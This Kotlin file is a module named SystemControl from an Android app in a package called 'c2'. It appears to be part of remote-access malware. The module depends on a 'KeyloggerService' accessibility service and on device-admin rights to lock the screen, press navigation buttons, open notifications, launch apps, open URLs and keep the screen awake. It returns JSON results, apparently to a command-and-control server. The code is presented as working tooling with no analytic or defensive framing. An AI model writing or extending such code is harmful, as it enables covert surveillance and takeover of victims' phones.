package com.outcome.c2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import org.json.JSONObject

object SystemControl {

    fun lockScreen(ctx: Context): JSONObject {
        // 1) Accessibility service (no admin needed)
        val acc = KeyloggerService.instance
        if (acc != null) {
            val ok = acc.lockScreen()
            if (ok) return JSONObject().put("ok", true).put("method", "accessibility")
        }

        // 2) Device admin
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                return JSONObject().put("ok", true).put("method", "dpm")
            }
        } catch (_: Exception) {}

        return JSONObject().put("error", "no_lock_method - enable accessibility service")
    }

    fun goHome(): JSONObject {
        val acc = KeyloggerService.instance
            ?: return JSONObject().put("error", "accessibility_not_active")
        return JSONObject().put("ok", acc.goHome())
    }

    fun back(): JSONObject {
        val acc = KeyloggerService.instance
            ?: return JSONObject().put("error", "accessibility_not_active")
        return JSONObject().put("ok", acc.back())
    }

    fun recents(): JSONObject {
        val acc = KeyloggerService.instance
            ?: return JSONObject().put("error", "accessibility_not_active")
        return JSONObject().put("ok", acc.recents())
    }

    fun openNotifications(): JSONObject {
        val acc = KeyloggerService.instance
            ?: return JSONObject().put("error", "accessibility_not_active")
        return JSONObject().put("ok", acc.notifications())
    }

    fun openApp(ctx: Context, pkg: String): JSONObject {
        return try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) JSONObject().put("error", "package_not_found")
            else {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
                JSONObject().put("ok", true).put("package", pkg)
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "open_failed")
        }
    }

    fun openUrl(ctx: Context, url: String): JSONObject {
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            JSONObject().put("ok", true).put("url", url)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "open_url_failed")
        }
    }

    fun wakeLock(ctx: Context, ms: Long): JSONObject {
        return try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            val lock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "c2:wake")
            lock.acquire(ms)
            JSONObject().put("ok", true).put("duration", ms)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "wakelock_failed")
        }
    }
}
